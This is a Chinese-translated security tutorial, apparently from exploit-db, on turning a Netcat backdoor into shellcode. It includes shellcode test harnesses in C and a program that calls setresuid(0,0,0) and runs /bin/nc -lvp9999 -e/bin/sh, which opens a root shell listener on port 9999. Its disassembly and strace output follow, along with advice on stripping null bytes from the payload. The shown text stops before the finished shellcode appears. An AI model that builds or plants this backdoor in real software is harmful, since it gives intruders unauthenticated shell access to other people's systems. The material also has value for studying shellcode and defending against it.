# 【技术文章】NC后门技术（shellcode版）
|
##### 译文声明
本文是翻译文章，文章来源：exploit-db.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
**翻译：**[ **rac_cp**
****](http://bobao.360.cn/member/contribute?uid=2796348634)
**预估稿费：150RMB（不服你也来投稿啊！）**
******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:PI:EMAIL) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******
**免责声明：小心！不要将这个程序（技术）使用在你编写的软件中，否则可能会给自己带来牢狱之灾。**
**一、引言—-什么是NetCat（瑞士军刀）**
Netcat是一个unix实用程序，它可以实现使用TCP或者UDP协议来实现网络传输数据的功能。
它设计的目的是成为一个可以直接被其他程序或脚本直接加载的“后端”执行工具。
它是一个功能丰富网络调试和探索工具，因为它可以创建几乎任何种类的连接，并且还提供了几个有趣的内置功能。
Netcat（简称为“nc”）目前已经成为unix系统自带的程序。
Netcat被认为是20大网络调试工具之一，它具备以下多种功能：
1\. 连接到某个服务器
2\. 作为一个后门使用
3\. 传输数据
4\. 几乎可以连接所有的“TCP/IP”端口
5\. 其它
现如今作为一个系统管理员应该（“必须”）学习如何使用netcat来连接其他计算机等功能。在本文中，我会告诉你一个netcat
shellcode，可以在软件后台打开一个端口并向外提供连接以实现后门的功能。
**二、繁琐的过程**
我作为计算机爱好者和一个软件程序员已经花了好几个星期时间来搜索如何使用netcat来做一个shellcode的后门，这是非常困难的一个过程工具，因为它是一个网络调试工具。
首先我们写两个C程序来测试shellcode：
    #include   //IO header
    #include  //Functions on favor of strings
    #include  //exit() function
    char shellcode[] = ""; /* Global array */
    int main(int argc, char **argv)
    {
    int (*ret)(); /* ret is a func pointer*/
        ret = (int(*)())shellcode; /* ret points to our shellcode */
        (int)(*ret)();/* shellcode is type caste as a function */
        exit(0)/* exit() */
    }
第二个程序是关于Mmap.c测试程序：
    #include //IO header
    #include //MMAN sys func
    #include  //Functions on favor of strings
    #include //Define Var types
    #include //Defines misc symbolic constants and types, and declares misc functions
    int (*shellcodetotest)(); /* Global Variable type int, shellcodetotest is a func pointer */
    char shellcode[] = "";/* Global array */
    int main(int argc, char **argv) 
    {
    void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);/* Mmap functions passed to *ptr pointer */
    if(ptr == MAP_FAILED)  
    {
    perror("mmap");/* Func to error of program */
    exit(-1);
    }
    memcpy(ptr, shellcode, sizeof(shellcode)); /* Memcpy function */
    shellcodetotest = ptr;/* Here we test the shellcode with mmap functions */
    shellcodetotest();/* Exec the shellcode */
    return 0;/* return */
    }
接下来应该做的工作是：
1\. 准备一个C程序去执行nc命令
2\. 测试
3\. 调试
    root@MINDZSEC:~# nano ntcat.c
    #include 
    #include 
    #include 
    int main()
    {
    setresuid(0,0,0); /* Set res UID 0 0 0 to all program */
    char *envp[] = { NULL }; 
    char *argv[] = {"/bin/nc", "-lvp9999", "-e/bin/sh", NULL};
    int ret = execve("/bin/nc", argv, envp); /* exec the command */
    }
接下来编译这个程序
    root@MINDZSEC:~# gcc -S ntcat.c (-S switch for asm lang)
汇编
    root@MINDZSEC:~# as ntcat.s -o ntcat.o
链接
    root@MINDZSEC:~# ld ntcat.o -o ntcat
运行
    root@MINDZSEC:~# ./ntcat
（其实我写的时候用的是gcc ntcat.c -o
ntcat直接编译生成的，并没有照着原作者那样一步一步生成，下图中可以看到，程序运行起来后，是使用nc程序直接监听9999端口的。）
反汇编程序
    root@MINDZSEC:~# objdump -d ntcat.o
得到
    ntcat.o:     file format elf32-i386
    Disassembly of section .text:
    00000000 :
    0:55                   push   %ebp
    1:89 e5                mov    %esp,%ebp
    3:83 e4 f0             and    $0xfffffff0,%esp
    6:83 ec 30             sub    $0x30,%esp
    9:c7 44 24 08 00 00 00 movl   $0x0,0x8(%esp)
    10:00 
    11:c7 44 24 04 00 00 00 movl   $0x0,0x4(%esp)
    18:00 
    19:c7 04 24 00 00 00 00 movl   $0x0,(%esp)
    20:e8 fc ff ff ff       call   21 
    25:c7 44 24 28 00 00 00 movl   $0x0,0x28(%esp)
    2c:00 
    2d:c7 44 24 18 00 00 00 movl   $0x0,0x18(%esp)
    34:00 
    35:c7 44 24 1c 08 00 00 movl   $0x8,0x1c(%esp)
    3c:00 
    3d:c7 44 24 20 11 00 00 movl   $0x11,0x20(%esp)
    44:00 
    45:c7 44 24 24 00 00 00 movl   $0x0,0x24(%esp)
    4c:00 
    4d:8d 44 24 28          lea    0x28(%esp),%eax
    51:89 44 24 08          mov    %eax,0x8(%esp)
    55:8d 44 24 18          lea    0x18(%esp),%eax
    59:89 44 24 04          mov    %eax,0x4(%esp)
    5d:c7 04 24 00 00 00 00 movl   $0x0,(%esp)
    64:e8 fc ff ff ff       call   65 
    69:89 44 24 2c          mov    %eax,0x2c(%esp)
    6d:c9                   leave  
    6e:c3                   ret
可以通过strace来追踪系统调用执行的情况
    root@MINDZSEC:~# strace ./ntcat
    execve("./ntcat", ["./ntcat"], [/* 31 vars */]) = 0
    brk(0)                                  = 0x9966000
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7764000
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    open("/etc/ld.so.cache", O_RDONLY)      = 3
    fstat64(3, {st_mode=S_IFREG|0644, st_size=103011, ...}) = 0
    mmap2(NULL, 103011, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb774a000
    close(3)                                = 0
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/i386-linux-gnu/i686/cmov/libc.so.6", O_RDONLY) = 3
可以看到第一个syscall是执行了我们的程序，接下来再去进行打开动态链接库等操作。
上面c程序生成的这段代码里面很多操作码都包括'x00'字段（NULL字段），为了生成可用的shellcode，需要记住下面的这个规则：
记住总是使用寄存器的最小部分越有可能避免null，而且xor操作是一个非常好用的gadget。
我们不需要使用这段代码去测试它，就知道这段代码直接当做shellcode是不会执行的，因为里面的操作码包括‘x00’（strcpy会截断所以执行不下去），所以我们需要退回到汇编语言去重新处理这段代码。
开始之前，需要记住以下几条：
shellcode中不能有NULL
shellcode不能使用静态地址
Xor操作是一个非常有用的gadget